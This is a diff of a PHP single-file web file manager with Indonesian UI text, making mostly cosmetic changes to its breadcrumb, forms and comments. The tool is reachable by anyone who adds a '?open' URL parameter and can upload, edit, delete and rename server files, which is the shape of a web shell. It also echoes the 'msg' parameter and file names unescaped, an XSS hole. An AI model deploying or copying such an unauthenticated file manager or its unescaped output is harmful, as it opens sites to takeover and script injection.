@@ -8,14 +8,14 @@ if (!isset($_GET['open'])) {
     die("Akses ditolak. Gunakan ?open untuk mengakses file manager.");
 }
 
-// Root direktori (ubah jika perlu)
+// Ganti ke root custom jika mau, mis: "/home/tutorzoo"
 $ROOT_DIR = __DIR__;
 
-/* ====== SAFE PATH ====== */
+// --- SECURITY: Batasi path agar tidak keluar root ---
 function safe_path($root, $path) {
-    $rootReal = realpath($root);
+    $base = realpath($root);
     $real = realpath($root . '/' . $path);
-    if ($real === false || strncmp($real, $rootReal, strlen($rootReal)) !== 0) {
+    if ($real === false || strncmp($real, $base, strlen($base)) !== 0) {
         return false;
     }
     return $real;
@@ -27,7 +27,7 @@ if ($currentDir === false) $currentDir = $ROOT_DIR;
 
 $msg = "";
 
-/* ====== ACTIONS ====== */
+// ==== Actions ====
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
     $action = $_POST['action'];
 
@@ -89,7 +89,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
             $currentDir = $newDir;
             $msg = "Berpindah ke: " . $newPath;
         } else {
-            $msg = "Path tidak valid";
+            $msg = "Path tidak valid atau di luar root.";
         }
     }
 
@@ -97,14 +97,12 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
     exit;
 }
 
-/* ====== EDIT MODE ====== */
 $editFile = null;
 if (isset($_GET['edit'])) {
     $editPath = safe_path($currentDir, $_GET['edit']);
     if ($editPath && is_file($editPath)) $editFile = $editPath;
 }
 
-/* ====== LIST DIR ====== */
 $items = scandir($currentDir);
 ?>
 <!doctype html>
@@ -126,67 +124,69 @@ input[type=text]{max-width:140px}
 <body>
 <div class="container py-4">
 
-    <h3 class="fw-semibold mb-1">File Manager</h3>
-    <div class="text-secondary mb-3">Modern • Minimal • Clean UI</div>
+    <h3 class="fw-semibold mb-2">File Manager</h3>
 
     <?php if (isset($_GET['msg'])): ?>
-        <div class="alert alert-success card-modern mb-3"><?=$_GET['msg']?></div>
+        <div class="alert alert-success card-modern shadow-sm mb-3"><?=$_GET['msg']?></div>
     <?php endif; ?>
 
     <div class="card card-modern shadow-sm mb-4">
         <div class="card-body d-flex flex-wrap justify-content-between align-items-center gap-2">
 
-            <!-- ====== NAVIGATION PATH (Breadcrumb) ====== -->
+            <!-- ===== PATH / BREADCRUMB (PWD + clickable) ===== -->
             <div>
                 <strong class="text-secondary">Path</strong> :
 
                 <?php
-                $cwdRel = trim($cwd, '/');
-                $parts = $cwdRel === '' ? [] : explode('/', $cwdRel);
+                $rootAbs = realpath($ROOT_DIR);
+                $absPath = realpath($currentDir);
 
-                echo '<a class="link-primary" href="?open&p=">/</a> ';
+                // tampilkan PWD absolut
+                echo '<span class="me-2">'.htmlspecialchars($absPath).'</span>';
+
+                // buat breadcrumb relatif hanya untuk link
+                $rel = trim(str_replace($rootAbs, '', $absPath), '/');
+                $parts = $rel === '' ? [] : explode('/', $rel);
+
+                echo '<a class="link-primary" href="?open&p=">/</a>';
 
                 $build = '';
                 foreach ($parts as $part) {
                     if ($part === '') continue;
-                    $build = ltrim($build . '/' . $part, '/');
-                    echo '<a class="link-primary" href="?open&p='.urlencode($build).'">'
-                        . htmlspecialchars($part) .
-                        '</a> / ';
+                    $build = ltrim($build.'/'.$part, '/');
+                    echo ' <a class="link-primary" href="?open&p='.urlencode($build).'">'
+                        .htmlspecialchars($part).'</a> /';
                 }
                 ?>
             </div>
 
-            <!-- ====== TOOLS ====== -->
+            <!-- TOOLS -->
             <div class="d-flex gap-2 flex-wrap">
 
                 <form method="post" class="d-flex gap-2">
                     <input type="hidden" name="action" value="cd">
                     <input type="text" name="cd_path" class="form-control form-control-sm"
-                           placeholder="Path relatif" value="<?=htmlspecialchars($cwd)?>">
-                    <button class="btn btn-secondary btn-sm px-3">Go</button>
+                        placeholder="Path relatif root" value="<?=htmlspecialchars($cwd)?>">
+                    <button class="btn btn-secondary btn-sm">Go</button>
                 </form>
 
                 <form method="post" enctype="multipart/form-data" class="d-flex gap-2">
                     <input type="hidden" name="action" value="upload">
                     <input type="file" name="file" class="form-control form-control-sm" required>
-                    <button class="btn btn-primary btn-sm px-3">Upload</button>
+                    <button class="btn btn-primary btn-sm">Upload</button>
                 </form>
 
                 <form method="post" class="d-flex gap-2">
                     <input type="hidden" name="action" value="create_folder">
-                    <input type="text" name="folder_name" class="form-control form-control-sm"
-                           placeholder="Nama Folder" required>
-                    <button class="btn btn-success btn-sm px-3">Buat Folder</button>
+                    <input type="text" name="folder_name" class="form-control form-control-sm" placeholder="Nama Folder">
+                    <button class="btn btn-success btn-sm">Buat Folder</button>
                 </form>
 
                 <form method="post" class="d-flex gap-2">
                     <input type="hidden" name="action" value="create_file">
-                    <input type="text" name="file_name" class="form-control form-control-sm"
-                           placeholder="Nama File" required>
-                    <button class="btn btn-info btn-sm px-3">Buat File</button>
+                    <input type="text" name="file_name" class="form-control form-control-sm" placeholder="Nama File">
+                    <button class="btn btn-info btn-sm">Buat File</button>
                 </form>
-
             </div>
         </div>
     </div>
@@ -201,8 +201,10 @@ input[type=text]{max-width:140px}
                 <input type="hidden" name="action" value="save">
                 <input type="hidden" name="file" value="<?=htmlspecialchars($_GET['edit'])?>">
                 <textarea name="content" rows="12" class="form-control mb-3"><?=htmlspecialchars(file_get_contents($editFile))?></textarea>
-                <button class="btn btn-primary px-3">Simpan</button>
-                <a href="?open&p=<?=urlencode($cwd)?>" class="btn btn-outline-secondary ms-2">Batal</a>
+                <div class="d-flex gap-2">
+                    <button class="btn btn-primary">Simpan</button>
+                    <a href="?open&p=<?=urlencode($cwd)?>" class="btn btn-outline-secondary">Batal</a>
+                </div>
             </form>
         </div>
     </div>
@@ -241,10 +243,8 @@ input[type=text]{max-width:140px}
                         <?=$it?>
                     <?php endif; ?>
                 </td>
-
                 <td><?=$isDir ? 'Folder' : 'File'?></td>
                 <td><?=$isDir ? '—' : filesize($full).' bytes'?></td>
-
                 <td class="text-end">
 
                     <?php if(!$isDir): ?>
@@ -252,8 +252,7 @@ input[type=text]{max-width:140px}
                            href="?open&p=<?=urlencode($cwd)?>&edit=<?=urlencode($it)?>">Edit</a>
                     <?php endif; ?>
 
-                    <form method="post" class="d-inline"
-                          onsubmit="return confirm('Hapus item ini?')">
+                    <form method="post" class="d-inline" onsubmit="return confirm('Hapus item ini?')">
                         <input type="hidden" name="action" value="delete">
                         <input type="hidden" name="target" value="<?=htmlspecialchars($it)?>">
                         <button class="btn btn-sm btn-outline-danger">Delete</button>
@@ -262,11 +261,9 @@ input[type=text]{max-width:140px}
                     <form method="post" class="d-inline">
                         <input type="hidden" name="action" value="rename">
                         <input type="hidden" name="old" value="<?=htmlspecialchars($it)?>">
-                        <input type="text" name="new" class="form-control form-control-sm d-inline"
-                               placeholder="rename">
+                        <input type="text" name="new" class="form-control form-control-sm d-inline" placeholder="rename">
                         <button class="btn btn-sm btn-outline-secondary">OK</button>
                     </form>
-
                 </td>
             </tr>
             <?php endforeach; ?>
